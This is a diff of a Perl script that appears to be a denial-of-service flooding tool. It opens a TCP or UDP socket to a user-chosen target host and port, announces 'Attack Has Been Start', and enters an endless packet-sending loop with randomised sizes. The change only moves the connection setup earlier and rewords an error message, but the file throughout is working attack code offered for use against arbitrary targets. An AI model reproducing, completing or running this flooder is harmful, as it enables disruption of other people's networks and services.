@@ -1,7 +1,6 @@
 #!/usr/bin/perl
 
 use IO::Socket;
-
 system("clear || cls");
 #Script Banner================================================================
 print q{
@@ -51,18 +50,19 @@ while ($proto eq "" || !grep{$proto eq $_} 'TCP','UDP','tcp','udp'){
  chomp ($proto);
 }
 print "Protocol ==> $proto";
-print "\n===============================";
+print "\n===============================\n";
 sleep(2);
+{
+$sock = IO::Socket::INET->new (
+        PeerAddr => $host,
+        PeerPort => $port,
+        Proto => "$proto" ) || die "\n[!] Error: Connection Faild To Target[ $host ] !!!\n[!] Please Check Your Intenet Connection !\n[!] OR Mabye The Problem From TARGET Side !\n";
+}
+
 system("clear || cls");
 print "\n[*] Attack Has Been Start On [$host:$port] proto => [$proto].......\n\n";
 sleep(3);
 
-{
-$sock = IO::Socket::INET->new (
-	PeerAddr => $host,
-	PeerPort => $port,
-	Proto => "$proto" ) || die "\n[!] Something Went Wrong ";
-}
 packets:
 while (1) {
 $size = rand() * 8921873 * 99919988;
